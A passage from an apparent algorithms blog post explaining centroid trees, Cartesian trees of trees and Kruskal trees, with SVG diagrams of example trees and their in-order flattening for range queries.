      <ellipse fill="none" stroke="black" cx="126" cy="-162" rx="18" ry="18" />
      <text text-anchor="middle" x="126" y="-158.3" font-family="Times,serif" font-size="14.00">e</text>
    </g>
    <g class="node">
      <title>b</title>
      <ellipse fill="none" stroke="black" cx="72" cy="-90" rx="18" ry="18" />
      <text text-anchor="middle" x="72" y="-86.3" font-family="Times,serif" font-size="14.00">b</text>
    </g>
    <g class="edge">
      <title>e-&gt;b</title>
      <path fill="none" stroke="black" d="M115.33,-147.17C107.79,-137.39 97.52,-124.08 88.87,-112.87" />
      <polygon fill="black" stroke="black" points="91.53,-110.58 82.65,-104.8 85.98,-114.86 91.53,-110.58" />
    </g>
    <g class="node">
      <title>g</title>
      <ellipse fill="none" stroke="black" cx="126" cy="-90" rx="18" ry="18" />
      <text text-anchor="middle" x="126" y="-86.3" font-family="Times,serif" font-size="14.00">g</text>
    </g>
    <g class="edge">
      <title>e-&gt;g</title>
      <path fill="none" stroke="black" d="M126,-143.7C126,-135.98 126,-126.71 126,-118.11" />
      <polygon fill="black" stroke="black" points="129.5,-118.1 126,-108.1 122.5,-118.1 129.5,-118.1" />
    </g>
    <g class="node">
      <title>c</title>
      <ellipse fill="none" stroke="black" cx="180" cy="-90" rx="18" ry="18" />
      <text text-anchor="middle" x="180" y="-86.3" font-family="Times,serif" font-size="14.00">c</text>
    </g>
    <g class="edge">
      <title>e-&gt;c</title>
      <path fill="none" stroke="black" d="M136.67,-147.17C144.21,-137.39 154.48,-124.08 163.13,-112.87" />
      <polygon fill="black" stroke="black" points="166.02,-114.86 169.35,-104.8 160.47,-110.58 166.02,-114.86" />
    </g>
    <g class="node">
      <title>d</title>
      <ellipse fill="none" stroke="black" cx="18" cy="-18" rx="18" ry="18" />
      <text text-anchor="middle" x="18" y="-14.3" font-family="Times,serif" font-size="14.00">d</text>
    </g>
    <g class="edge">
      <title>b-&gt;d</title>
      <path fill="none" stroke="black" d="M61.33,-75.17C53.79,-65.39 43.52,-52.08 34.87,-40.87" />
      <polygon fill="black" stroke="black" points="37.53,-38.58 28.65,-32.8 31.98,-42.86 37.53,-38.58" />
    </g>
    <g class="node">
      <title>i</title>
      <ellipse fill="none" stroke="black" cx="72" cy="-18" rx="18" ry="18" />
      <text text-anchor="middle" x="72" y="-14.3" font-family="Times,serif" font-size="14.00">i</text>
    </g>
    <g class="edge">
      <title>b-&gt;i</title>
      <path fill="none" stroke="black" d="M72,-71.7C72,-63.98 72,-54.71 72,-46.11" />
      <polygon fill="black" stroke="black" points="75.5,-46.1 72,-36.1 68.5,-46.1 75.5,-46.1" />
    </g>
    <g class="node">
      <title>a</title>
      <ellipse fill="none" stroke="black" cx="126" cy="-18" rx="18" ry="18" />
      <text text-anchor="middle" x="126" y="-14.3" font-family="Times,serif" font-size="14.00">a</text>
    </g>
    <g class="edge">
      <title>c-&gt;a</title>
      <path fill="none" stroke="black" d="M169.33,-75.17C161.79,-65.39 151.52,-52.08 142.87,-40.87" />
      <polygon fill="black" stroke="black" points="145.53,-38.58 136.65,-32.8 139.98,-42.86 145.53,-38.58" />
    </g>
    <g class="node">
      <title>f</title>
      <ellipse fill="none" stroke="black" cx="180" cy="-18" rx="18" ry="18" />
      <text text-anchor="middle" x="180" y="-14.3" font-family="Times,serif" font-size="14.00">f</text>
    </g>
    <g class="edge">
      <title>c-&gt;f</title>
      <path fill="none" stroke="black" d="M180,-71.7C180,-63.98 180,-54.71 180,-46.11" />
      <polygon fill="black" stroke="black" points="183.5,-46.1 180,-36.1 176.5,-46.1 183.5,-46.1" />
    </g>
    <g class="node">
      <title>h</title>
      <ellipse fill="none" stroke="black" cx="234" cy="-18" rx="18" ry="18" />
      <text text-anchor="middle" x="234" y="-14.3" font-family="Times,serif" font-size="14.00">h</text>
    </g>
    <g class="edge">
      <title>c-&gt;h</title>
      <path fill="none" stroke="black" d="M190.67,-75.17C198.21,-65.39 208.48,-52.08 217.13,-40.87" />
      <polygon fill="black" stroke="black" points="220.02,-42.86 223.35,-32.8 214.47,-38.58 220.02,-42.86" />
    </g>
  </g>
</svg>
<p><em>Figure 2: The centroid decomposition of the above tree</em></p>

<p>Centroid trees are similar to binary search trees in that</p>

<ol>
  <li>the height is small; and</li>
  <li>nodes in a subtree represent connected elements.</li>
</ol>

<p>These properties are useful for “binary searching” on a tree e.g. in the problems <a href="https://orac.amt.edu.au/cgi-bin/train/problem.pl?set=fario19&amp;problemid=1064">Nav (FARIO 2019)</a> and <a href="https://codeforces.com/problemset/problem/1192/B">Dynamic Diameter (CEOI 2019)</a>. In fact, the centroid tree and the binary search tree of a <a href="https://en.wikipedia.org/wiki/Path_graph">linear/path graph</a> are identical.</p>

<h2 id="cartesian-tree-of-a-tree"><a href="#cartesian-tree-of-a-tree">Cartesian Tree of a Tree</a></h2>

<p>By using the similarity between centroid trees and binary search trees, we can arrive at the Cartesian tree of a tree: Instead of extracting the centroid, we instead extract the node with the least value. Just like centroid trees, doing this conversion on a linear graph produces a normal Cartesian tree.</p>

<p>However, this data structure isn’t of much interest to us (we’re using just as a stepping stone towards Kruskal Trees). One possible use to convert queries of “what is the minimum node on the path from A to B” into <a href="https://en.wikipedia.org/wiki/Lowest_common_ancestor">Lowest Common Ancestor</a> queries. It’s likely that “what is the minimum node in a given connected subgraph” queries can also be supported using a similar method.</p>

<h2 id="kruskal-tree"><a href="#kruskal-tree">Kruskal Tree</a></h2>

<blockquote>
  <p>These were called <em>edge trees</em> in my original post, but I feel <em>Kruskal tree</em> is a better name given the similarities between the tree I describe and Kruskal’s algorithm.</p>
</blockquote>

<p>One annoying aspect of the above data structure is that the number of children of each node is practically unbounded, with the worst case being a <a href="https://en.wikipedia.org/wiki/Star_(graph_theory)">star graph</a>. One method of sidestepping this issue (and getting a few other benefits) is to instead build the data structure over the <em>edges</em> of the input, instead of the vertices:</p>

<ol>
  <li>Pick the edge with the largest weight and extract it as the root of a new tree</li>
  <li>Recursively transform the two remaining components and add them as children of the extracted edge.</li>
</ol>

<p>As an example, if we perform this procedure on this tree:</p>

<svg xmlns="http://www.w3.org/2000/svg" width="364pt" height="132pt" viewBox="0.00 0.00 364.00 132.00">
  <g class="graph" transform="scale(1 1) rotate(0) translate(4 128)">
    <title>%3</title>
    <g class="node">
      <title>h</title>
      <ellipse fill="none" stroke="black" cx="98" cy="-29" rx="18" ry="18" />
      <text text-anchor="middle" x="98" y="-25.3" font-family="Times,serif" font-size="14.00">h</text>
    </g>
    <g class="node">
      <title>b</title>
      <ellipse fill="none" stroke="black" cx="178" cy="-18" rx="18" ry="18" />
      <text text-anchor="middle" x="178" y="-14.3" font-family="Times,serif" font-size="14.00">b</text>
    </g>
    <g class="edge">
      <title>h--b</title>
      <path fill="none" stroke="black" d="M115.19,-23.44C121.04,-21.68 127.75,-19.95 134,-19 142.42,-17.72 151.86,-17.38 159.76,-17.4" />
      <text text-anchor="middle" x="138" y="-22.8" font-family="Times,serif" font-size="14.00">3</text>
    </g>
    <g class="node">
      <title>d</title>
      <ellipse fill="none" stroke="black" cx="178" cy="-83" rx="18" ry="18" />
      <text text-anchor="middle" x="178" y="-79.3" font-family="Times,serif" font-size="14.00">d</text>
    </g>
    <g class="edge">
      <title>h--d</title>
      <path fill="none" stroke="black" d="M113.31,-38.9C127.38,-48.65 148.74,-63.44 162.78,-73.16" />
      <text text-anchor="middle" x="138" y="-60.8" font-family="Times,serif" font-size="14.00">1</text>
    </g>
    <g class="node">
      <title>c</title>
      <ellipse fill="none" stroke="black" cx="258" cy="-106" rx="18" ry="18" />
      <text text-anchor="middle" x="258" y="-102.3" font-family="Times,serif" font-size="14.00">c</text>
    </g>
    <g class="edge">
      <title>d--c</title>
      <path fill="none" stroke="black" d="M195.54,-87.88C208.78,-91.78 227.25,-97.23 240.48,-101.13" />
      <text text-anchor="middle" x="218" y="-98.8" font-family="Times,serif" font-size="14.00">2</text>
    </g>
    <g class="node">
      <title>g</title>
      <ellipse fill="none" stroke="black" cx="258" cy="-52" rx="18" ry="18" />
      <text text-anchor="middle" x="258" y="-48.3" font-family="Times,serif" font-size="14.00">g</text>
    </g>
    <g class="edge">
      <title>d--g</title>
      <path fill="none" stroke="black" d="M195.16,-76.58C208.64,-71.22 227.73,-63.63 241.13,-58.31" />
      <text text-anchor="middle" x="218" y="-71.8" font-family="Times,serif" font-size="14.00">3</text>
    </g>
    <g class="node">
      <title>e</title>
      <ellipse fill="none" stroke="black" cx="338" cy="-52" rx="18" ry="18" />
      <text text-anchor="middle" x="338" y="-48.3" font-family="Times,serif" font-size="14.00">e</text>
    </g>
    <g class="edge">
      <title>g--e</title>
      <path fill="none" stroke="black" d="M276.31,-52C289.24,-52 306.82,-52 319.74,-52" />
      <text text-anchor="middle" x="298" y="-55.8" font-family="Times,serif" font-size="14.00">4</text>
    </g>
    <g class="node">
      <title>f</title>
      <ellipse fill="none" stroke="black" cx="98" cy="-94" rx="18" ry="18" />
      <text text-anchor="middle" x="98" y="-90.3" font-family="Times,serif" font-size="14.00">f</text>
    </g>
    <g class="edge">
      <title>f--d</title>
      <path fill="none" stroke="black" d="M115.92,-91.61C129.01,-89.77 147.03,-87.23 160.11,-85.38" />
      <text text-anchor="middle" x="138" y="-91.8" font-family="Times,serif" font-size="14.00">4</text>
    </g>
    <g class="node">
      <title>a</title>
      <ellipse fill="none" stroke="black" cx="18" cy="-29" rx="18" ry="18" />
      <text text-anchor="middle" x="18" y="-25.3" font-family="Times,serif" font-size="14.00">a</text>
    </g>
    <g class="edge">
      <title>a--h</title>
      <path fill="none" stroke="black" d="M36.31,-29C49.24,-29 66.82,-29 79.74,-29" />
      <text text-anchor="middle" x="58" y="-32.8" font-family="Times,serif" font-size="14.00">2</text>
    </g>
  </g>
</svg>
<p><em>Figure 3: A weighted tree</em></p>

<p>We’ll get the following tree:</p>

<svg xmlns="http://www.w3.org/2000/svg" width="210pt" height="260pt" viewBox="0.00 0.00 210.19 260.00">
  <g class="graph" transform="scale(1 1) rotate(0) translate(4 256)">
    <title>%3</title>
    <g class="node">
      <title>df</title>
      <ellipse fill="none" stroke="black" cx="35.1" cy="-18" rx="35.19" ry="18" />
      <text text-anchor="middle" x="35.1" y="-14.3" font-family="Times,serif" font-size="14.00">df(4)</text>
    </g>
    <g class="node">
      <title>dg</title>
      <ellipse fill="none" stroke="black" cx="79.1" cy="-90" rx="35.19" ry="18" />
      <text text-anchor="middle" x="79.1" y="-86.3" font-family="Times,serif" font-size="14.00">dg(3)</text>
    </g>
    <g class="edge">
      <title>dg-&gt;df</title>
      <path fill="none" stroke="black" d="M68.89,-72.76C63.58,-64.32 56.97,-53.8 51.01,-44.31" />
      <polygon fill="black" stroke="black" points="53.84,-42.24 45.55,-35.63 47.91,-45.96 53.84,-42.24" />
    </g>
    <g class="node">
      <title>eg</title>
      <ellipse fill="none" stroke="black" cx="123.1" cy="-18" rx="35.19" ry="18" />
      <text text-anchor="middle" x="123.1" y="-14.3" font-family="Times,serif" font-size="14.00">eg(4)</text>
    </g>
    <g class="edge">
      <title>dg-&gt;eg</title>
      <path fill="none" stroke="black" d="M89.3,-72.76C94.61,-64.32 101.22,-53.8 107.19,-44.31" />
      <polygon fill="black" stroke="black" points="110.28,-45.96 112.64,-35.63 104.36,-42.24 110.28,-45.96" />
    </g>
    <g class="node">
      <title>cd</title>
      <ellipse fill="none" stroke="black" cx="79.1" cy="-162" rx="35.19" ry="18" />
      <text text-anchor="middle" x="79.1" y="-158.3" font-family="Times,serif" font-size="14.00">cd(2)</text>
    </g>
    <g class="edge">
      <title>cd-&gt;dg</title>
      <path fill="none" stroke="black" d="M79.1,-143.7C79.1,-135.98 79.1,-126.71 79.1,-118.11" />
      <polygon fill="black" stroke="black" points="82.6,-118.1 79.1,-108.1 75.6,-118.1 82.6,-118.1" />
    </g>
    <g class="node">
      <title>dh</title>
      <ellipse fill="none" stroke="black" cx="123.1" cy="-234" rx="35.19" ry="18" />
      <text text-anchor="middle" x="123.1" y="-230.3" font-family="Times,serif" font-size="14.00">dh(1)</text>
    </g>
    <g class="edge">
      <title>dh-&gt;cd</title>
      <path fill="none" stroke="black" d="M112.89,-216.76C107.58,-208.32 100.97,-197.8 95.01,-188.31" />
      <polygon fill="black" stroke="black" points="97.84,-186.24 89.55,-179.63 91.91,-189.96 97.84,-186.24" />
    </g>
    <g class="node">
      <title>ha</title>
      <ellipse fill="none" stroke="black" cx="167.1" cy="-162" rx="35.19" ry="18" />
      <text text-anchor="middle" x="167.1" y="-158.3" font-family="Times,serif" font-size="14.00">ha(2)</text>
    </g>
    <g class="edge">
      <title>dh-&gt;ha</title>
      <path fill="none" stroke="black" d="M133.3,-216.76C138.61,-208.32 145.22,-197.8 151.19,-188.31" />
      <polygon fill="black" stroke="black" points="154.28,-189.96 156.64,-179.63 148.36,-186.24 154.28,-189.96" />
    </g>
    <g class="node">
      <title>bh</title>
      <ellipse fill="none" stroke="black" cx="167.1" cy="-90" rx="35.19" ry="18" />
      <text text-anchor="middle" x="167.1" y="-86.3" font-family="Times,serif" font-size="14.00">bh(3)</text>
    </g>
    <g class="edge">
      <title>ha-&gt;bh</title>
      <path fill="none" stroke="black" d="M167.1,-143.7C167.1,-135.98 167.1,-126.71 167.1,-118.11" />
      <polygon fill="black" stroke="black" points="170.6,-118.1 167.1,-108.1 163.6,-118.1 170.6,-118.1" />
    </g>
  </g>
</svg>
<p><em>Figure 4: The result of transforming the previous tree</em></p>

<p>Do note that we lose the small tree height by doing this.</p>

<p>Due to the nature of edges, each node in our data structure is guaranteed to have at most 2 children, and so we will always get a binary tree out. With this transformation, we can convert “what is the minimum/<a href="https://en.wikipedia.org/wiki/Widest_path_problem">‘bottleneck’ edge</a> on the path from edge E to edge F” queries into <a href="https://en.wikipedia.org/wiki/Lowest_common_ancestor">Lowest Common Ancestor</a>, similar to the Cartesian tree.</p>

<p>However, typical <a href="https://en.wikipedia.org/wiki/Widest_path_problem">bottleneck edge</a> queries are based on the path between <em>vertices</em>, which we can support using a nice trick: adding individual vertices as <em>leaves</em> in our data structure<sup id="fnref:1" role="doc-noteref"><a href="#fn:1" class="footnote">1</a></sup> – another way of looking at it is that we add self-loops to every vertex in the input before transforming it. This final step gives us the Kruskal Tree.</p>

<p>Furthermore, we can also answer “how many vertices can be reached from V without traversing edges with weight under W?” by finding the highest ancestor of V with a weight of at least W, then counting the number of nodes in its subtree.</p>

<p>For general graphs, we can observe (using Kruskal’s Algorithm) that the bottleneck edge is always on the MST to reduce it to a tree problem. This data structure is also commonly made by augmenting Kruskal’s Algorithm to track the roots of components and to create edge nodes when merging them – hence the name.</p>

<h2 id="flattening-the-kruskal-tree"><a href="#flattening-the-kruskal-tree">Flattening the Kruskal Tree</a></h2>

<p>An interesting side-effect of making the tree binary is that an <a href="https://en.wikipedia.org/wiki/Tree_traversal#In-order_(LNR)">in-order traversal</a> is well-defined, and that <a href="https://en.wikipedia.org/wiki/Lowest_common_ancestor">LCA</a> can be converted into “what is the largest element in this subarray” (<a href="https://en.wikipedia.org/wiki/Range_minimum_query">Range Min Query, or RMQ</a>):</p>

<svg xmlns="http://www.w3.org/2000/svg" width="1088pt" height="553pt" viewBox="0.00 0.00 1088.00 552.91">
  <g class="graph" transform="scale(1 1) rotate(0) translate(4 548.91)">
    <title>%3</title>
    <g class="node">
      <title>ar</title>
      <polygon fill="none" stroke="black" points="0,-470.41 0,-544.41 1080,-544.41 1080,-470.41 0,-470.41" />
      <text text-anchor="middle" x="34" y="-499.91" font-family="Times,serif" font-size="30.00">c</text>
      <polyline fill="none" stroke="black" points="68,-470.41 68,-544.41" />
      <text text-anchor="middle" x="106" y="-516.41" font-family="Times,serif" font-size="30.00">cd</text>
      <text text-anchor="middle" x="106" y="-483.41" font-family="Times,serif" font-size="30.00">2</text>
      <polyline fill="none" stroke="black" points="144,-470.41 144,-544.41" />
      <text text-anchor="middle" x="178" y="-499.91" font-family="Times,serif" font-size="30.00">d</text>
      <polyline fill="none" stroke="black" points="212,-470.41 212,-544.41" />
      <text text-anchor="middle" x="250.5" y="-516.41" font-family="Times,serif" font-size="30.00">df</text>
      <text text-anchor="middle" x="250.5" y="-483.41" font-family="Times,serif" font-size="30.00">4</text>
      <polyline fill="none" stroke="black" points="289,-470.41 289,-544.41" />
      <text text-anchor="middle" x="323" y="-499.91" font-family="Times,serif" font-size="30.00">f</text>
      <polyline fill="none" stroke="black" points="357,-470.41 357,-544.41" />
      <text text-anchor="middle" x="395" y="-516.41" font-family="Times,serif" font-size="30.00">dg</text>
      <text text-anchor="middle" x="395" y="-483.41" font-family="Times,serif" font-size="30.00">3</text>
      <polyline fill="none" stroke="black" points="433,-470.41 433,-544.41" />
      <text text-anchor="middle" x="467" y="-499.91" font-family="Times,serif" font-size="30.00">e</text>
      <polyline fill="none" stroke="black" points="501,-470.41 501,-544.41" />
      <text text-anchor="middle" x="539.5" y="-516.41" font-family="Times,serif" font-size="30.00">eg</text>
      <text text-anchor="middle" x="539.5" y="-483.41" font-family="Times,serif" font-size="30.00">4</text>
      <polyline fill="none" stroke="black" points="578,-470.41 578,-544.41" />
      <text text-anchor="middle" x="612" y="-499.91" font-family="Times,serif" font-size="30.00">g</text>
      <polyline fill="none" stroke="black" points="646,-470.41 646,-544.41" />
      <text text-anchor="middle" x="684" y="-516.41" font-family="Times,serif" font-size="30.00">dh</text>
      <text text-anchor="middle" x="684" y="-483.41" font-family="Times,serif" font-size="30.00">1</text>
      <polyline fill="none" stroke="black" points="722,-470.41 722,-544.41" />
      <text text-anchor="middle" x="756" y="-499.91" font-family="Times,serif" font-size="30.00">a</text>
      <polyline fill="none" stroke="black" points="790,-470.41 790,-544.41" />
      <text text-anchor="middle" x="828.5" y="-516.41" font-family="Times,serif" font-size="30.00">ha</text>
      <text text-anchor="middle" x="828.5" y="-483.41" font-family="Times,serif" font-size="30.00">2</text>
      <polyline fill="none" stroke="black" points="867,-470.41 867,-544.41" />
      <text text-anchor="middle" x="901" y="-499.91" font-family="Times,serif" font-size="30.00">b</text>
      <polyline fill="none" stroke="black" points="935,-470.41 935,-544.41" />
      <text text-anchor="middle" x="973" y="-516.41" font-family="Times,serif" font-size="30.00">bh</text>
      <text text-anchor="middle" x="973" y="-483.41" font-family="Times,serif" font-size="30.00">3</text>
      <polyline fill="none" stroke="black" points="1011,-470.41 1011,-544.41" />
      <text text-anchor="middle" x="1045.5" y="-499.91" font-family="Times,serif" font-size="30.00">h</text>
    </g>
    <g class="node">
      <title>cd</title>
      <ellipse fill="none" stroke="black" cx="106" cy="-122.97" rx="28.98" ry="28.98" />
      <text text-anchor="middle" x="106" y="-115.47" font-family="Times,serif" font-size="30.00">cd</text>
    </g>
    <g class="edge">
      <title>ar:cd-&gt;cd</title>
      <path fill="none" stroke="grey" stroke-dasharray="5,2" d="M106,-469.91C106,-351.9 106,-211.24 106,-152.22" />
    </g>
    <g class="node">
      <title>dh</title>
      <ellipse fill="none" stroke="black" cx="684" cy="-28.99" rx="28.98" ry="28.98" />
      <text text-anchor="middle" x="684" y="-21.49" font-family="Times,serif" font-size="30.00">dh</text>
    </g>
    <g class="edge">
      <title>ar:dh-&gt;dh</title>
      <path fill="none" stroke="grey" stroke-dasharray="5,2" d="M684,-469.91C684,-399.7 684,-382.15 684,-311.94 684,-311.94 684,-311.94 684,-215.96 684,-159.94 684,-94.43 684,-58.03" />
    </g>
    <g class="node">
      <title>ha</title>
      <ellipse fill="none" stroke="black" cx="829" cy="-216.96" rx="28.98" ry="28.98" />
      <text text-anchor="middle" x="829" y="-209.46" font-family="Times,serif" font-size="30.00">ha</text>
    </g>
    <g class="edge">
      <title>ar:ha-&gt;ha</title>
      <path fill="none" stroke="grey" stroke-dasharray="5,2" d="M829,-469.91C829,-388.77 829,-292.93 829,-246.3" />
    </g>
    <g class="node">
      <title>dg</title>
      <ellipse fill="none" stroke="black" cx="395" cy="-216.96" rx="28.98" ry="28.98" />
      <text text-anchor="middle" x="395" y="-209.46" font-family="Times,serif" font-size="30.00">dg</text>
    </g>
    <g class="edge">
      <title>ar:dg-&gt;dg</title>
      <path fill="none" stroke="grey" stroke-dasharray="5,2" d="M395,-469.91C395,-388.77 395,-292.93 395,-246.3" />
    </g>
    <g class="node">
      <title>bh</title>
      <ellipse fill="none" stroke="black" cx="973" cy="-310.94" rx="28.98" ry="28.98" />
      <text text-anchor="middle" x="973" y="-303.44" font-family="Times,serif" font-size="30.00">bh</text>
    </g>
    <g class="edge">
      <title>ar:bh-&gt;bh</title>
      <path fill="none" stroke="grey" stroke-dasharray="5,2" d="M973,-469.91C973,-424.52 973,-371.8 973,-340.19" />
    </g>
    <g class="node">
      <title>df</title>
      <ellipse fill="none" stroke="black" cx="250" cy="-310.94" rx="28.98" ry="28.98" />
      <text text-anchor="middle" x="250" y="-303.44" font-family="Times,serif" font-size="30.00">df</text>
    </g>
    <g class="edge">
      <title>ar:df-&gt;df</title>
      <path fill="none" stroke="grey" stroke-dasharray="5,2" d="M250,-469.91C250,-424.52 250,-371.8 250,-340.19" />
    </g>
    <g class="node">
      <title>eg</title>
      <ellipse fill="none" stroke="black" cx="539" cy="-310.94" rx="28.98" ry="28.98" />
      <text text-anchor="middle" x="539" y="-303.44" font-family="Times,serif" font-size="30.00">eg</text>
    </g>
    <g class="edge">
      <title>ar:eg-&gt;eg</title>
      <path fill="none" stroke="grey" stroke-dasharray="5,2" d="M539,-469.91C539,-424.52 539,-371.8 539,-340.19" />
    </g>
    <g class="node">
      <title>c</title>
      <ellipse fill="none" stroke="black" cx="34" cy="-404.92" rx="28.98" ry="28.98" />
      <text text-anchor="middle" x="34" y="-397.42" font-family="Times,serif" font-size="30.00">c</text>
    </g>
    <g class="edge">
      <title>ar:c-&gt;c</title>
      <path fill="none" stroke="grey" stroke-dasharray="5,2" d="M34,-469.91C34,-458.14 34,-445.14 34,-433.96" />
    </g>
    <g class="node">
      <title>d</title>
      <ellipse fill="none" stroke="black" cx="178" cy="-404.92" rx="28.98" ry="28.98" />
      <text text-anchor="middle" x="178" y="-397.42" font-family="Times,serif" font-size="30.00">d</text>
    </g>
    <g class="edge">
      <title>ar:d-&gt;d</title>
      <path fill="none" stroke="grey" stroke-dasharray="5,2" d="M178,-469.91C178,-458.14 178,-445.14 178,-433.96" />
    </g>
    <g class="node">
      <title>f</title>
      <ellipse fill="none" stroke="black" cx="323" cy="-404.92" rx="28.98" ry="28.98" />
      <text text-anchor="middle" x="323" y="-397.42" font-family="Times,serif" font-size="30.00">f</text>
    </g>
    <g class="edge">
      <title>ar:f-&gt;f</title>
      <path fill="none" stroke="grey" stroke-dasharray="5,2" d="M323,-469.91C323,-458.14 323,-445.14 323,-433.96" />
    </g>
    <g class="node">
      <title>e</title>
      <ellipse fill="none" stroke="black" cx="467" cy="-404.92" rx="28.98" ry="28.98" />
      <text text-anchor="middle" x="467" y="-397.42" font-family="Times,serif" font-size="30.00">e</text>
    </g>
    <g class="edge">
      <title>ar:e-&gt;e</title>
      <path fill="none" stroke="grey" stroke-dasharray="5,2" d="M467,-469.91C467,-458.14 467,-445.14 467,-433.96" />
    </g>
    <g class="node">
      <title>g</title>
      <ellipse fill="none" stroke="black" cx="612" cy="-404.92" rx="28.98" ry="28.98" />
      <text text-anchor="middle" x="612" y="-397.42" font-family="Times,serif" font-size="30.00">g</text>
    </g>
    <g class="edge">
      <title>ar:g-&gt;g</title>
      <path fill="none" stroke="grey" stroke-dasharray="5,2" d="M612,-469.91C612,-458.14 612,-445.14 612,-433.96" />
    </g>
    <g class="node">
      <title>a</title>
      <ellipse fill="none" stroke="black" cx="756" cy="-404.92" rx="28.98" ry="28.98" />
      <text text-anchor="middle" x="756" y="-397.42" font-family="Times,serif" font-size="30.00">a</text>
    </g>
    <g class="edge">
      <title>ar:a-&gt;a</title>
      <path fill="none" stroke="grey" stroke-dasharray="5,2" d="M756,-469.91C756,-458.14 756,-445.14 756,-433.96" />
    </g>
    <g class="node">
      <title>b</title>
      <ellipse fill="none" stroke="black" cx="901" cy="-404.92" rx="28.98" ry="28.98" />
      <text text-anchor="middle" x="901" y="-397.42" font-family="Times,serif" font-size="30.00">b</text>
    </g>
    <g class="edge">
      <title>ar:b-&gt;b</title>
      <path fill="none" stroke="grey" stroke-dasharray="5,2" d="M901,-469.91C901,-458.14 901,-445.14 901,-433.96" />
    </g>
    <g class="node">
      <title>h</title>
      <ellipse fill="none" stroke="black" cx="1046" cy="-404.92" rx="28.98" ry="28.98" />
      <text text-anchor="middle" x="1046" y="-397.42" font-family="Times,serif" font-size="30.00">h</text>
    </g>
    <g class="edge">
      <title>ar:h-&gt;h</title>
      <path fill="none" stroke="grey" stroke-dasharray="5,2" d="M1046,-469.91C1046,-458.14 1046,-445.14 1046,-433.96" />
    </g>
    <g class="edge">
      <title>cd-&gt;dh</title>
      <path fill="none" stroke="black" d="M134.66,-117.41C230.01,-102.24 536.59,-53.45 645.32,-36.15" />
      <polygon fill="black" stroke="black" points="646.18,-39.55 655.51,-34.53 645.08,-32.64 646.18,-39.55" />
    </g>
    <g class="edge">
      <title>ha-&gt;dh</title>
      <path fill="none" stroke="black" d="M811.51,-193.53C785.6,-160.29 736.95,-97.9 707.81,-60.53" />
      <polygon fill="black" stroke="black" points="710.46,-58.24 701.55,-52.5 704.94,-62.54 710.46,-58.24" />
    </g>
    <g class="edge">
      <title>dg-&gt;cd</title>
      <path fill="none" stroke="black" d="M367.55,-207.22C315.47,-190.65 202.28,-154.62 143.35,-135.86" />
      <polygon fill="black" stroke="black" points="144.28,-132.48 133.69,-132.79 142.16,-139.15 144.28,-132.48" />
    </g>
    <g class="edge">
      <title>bh-&gt;ha</title>
      <path fill="none" stroke="black" d="M948.9,-294.54C925.02,-279.29 888.27,-255.81 861.75,-238.88" />
      <polygon fill="black" stroke="black" points="863.49,-235.84 853.18,-233.4 859.72,-241.74 863.49,-235.84" />
    </g>
    <g class="edge">
      <title>df-&gt;dg</title>
      <path fill="none" stroke="black" d="M274.27,-294.54C298.32,-279.29 335.32,-255.81 362.02,-238.88" />
      <polygon fill="black" stroke="black" points="364.08,-241.72 370.65,-233.4 360.33,-235.8 364.08,-241.72" />
    </g>
    <g class="edge">
      <title>eg-&gt;dg</title>
      <path fill="none" stroke="black" d="M514.9,-294.54C491.02,-279.29 454.27,-255.81 427.75,-238.88" />
      <polygon fill="black" stroke="black" points="429.49,-235.84 419.18,-233.4 425.72,-241.74 429.49,-235.84" />
    </g>
    <g class="edge">
      <title>c-&gt;cd</title>
      <path fill="none" stroke="black" d="M41.03,-376.57C54.02,-326.08 81.76,-218.21 96.44,-161.14" />
      <polygon fill="black" stroke="black" points="99.84,-161.99 98.94,-151.44 93.06,-160.25 99.84,-161.99" />
    </g>
    <g class="edge">
      <title>d-&gt;df</title>
      <path fill="none" stroke="black" d="M195.43,-381.66C204.65,-369.88 216.1,-355.25 226.13,-342.43" />
      <polygon fill="black" stroke="black" points="229.07,-344.35 232.48,-334.32 223.56,-340.04 229.07,-344.35" />
    </g>
    <g class="edge">
      <title>f-&gt;df</title>
      <path fill="none" stroke="black" d="M305.33,-381.66C295.98,-369.88 284.37,-355.25 274.2,-342.43" />
      <polygon fill="black" stroke="black" points="276.72,-339.98 267.76,-334.32 271.24,-344.33 276.72,-339.98" />
    </g>
    <g class="edge">
      <title>e-&gt;eg</title>
      <path fill="none" stroke="black" d="M484.43,-381.66C493.65,-369.88 505.1,-355.25 515.13,-342.43" />
      <polygon fill="black" stroke="black" points="518.07,-344.35 521.48,-334.32 512.56,-340.04 518.07,-344.35" />
    </g>
    <g class="edge">
      <title>g-&gt;eg</title>
      <path fill="none" stroke="black" d="M594.33,-381.66C584.98,-369.88 573.37,-355.25 563.2,-342.43" />
      <polygon fill="black" stroke="black" points="565.72,-339.98 556.76,-334.32 560.24,-344.33 565.72,-339.98" />
    </g>
    <g class="edge">
      <title>a-&gt;ha</title>
      <path fill="none" stroke="black" d="M766.3,-377.67C778.99,-345.37 800.58,-290.35 814.82,-254.07" />
      <polygon fill="black" stroke="black" points="818.23,-254.96 818.63,-244.37 811.72,-252.4 818.23,-254.96" />
    </g>
    <g class="edge">
      <title>b-&gt;bh</title>
      <path fill="none" stroke="black" d="M918.43,-381.66C927.65,-369.88 939.1,-355.25 949.13,-342.43" />
      <polygon fill="black" stroke="black" points="952.07,-344.35 955.48,-334.32 946.56,-340.04 952.07,-344.35" />
    </g>
    <g class="edge">
      <title>h-&gt;bh</title>
      <path fill="none" stroke="black" d="M1028.33,-381.66C1018.98,-369.88 1007.37,-355.25 997.2,-342.43" />
      <polygon fill="black" stroke="black" points="999.72,-339.98 990.76,-334.32 994.24,-344.33 999.72,-339.98" />
    </g>
  </g>
</svg>
<p><em>Figure 5: In-order traversal of the previous tree</em></p>

<p>This allows us to use a segment tree, which is much easier to implement than binary lifting/jump pointers. Plus, that diagram looks really nice.</p>

<h2 id="near-and-far-children"><a href="#near-and-far-children">Near and Far Children</a></h2>

<blockquote>
  <p>Originally called near-far ordering. I believe this is also different to the “macro-micro decomposition” referred to in the paper.</p>
</blockquote>

<p>An extension of the Kruskal Tree is to also track for each node which child is “between” it and its parent, in the sense that a path from it to the parent goes through edges in that subtree. For example, <code class="language-plaintext highlighter-rouge">bh</code> would “between” <code class="language-plaintext highlighter-rouge">ha</code> and <code class="language-plaintext highlighter-rouge">dh</code>. Our construction guarantees that for every edge except the root, exactly one child is “between” – we’ll call this the <em>near</em> child, and the other the <em>far</em> child.</p>

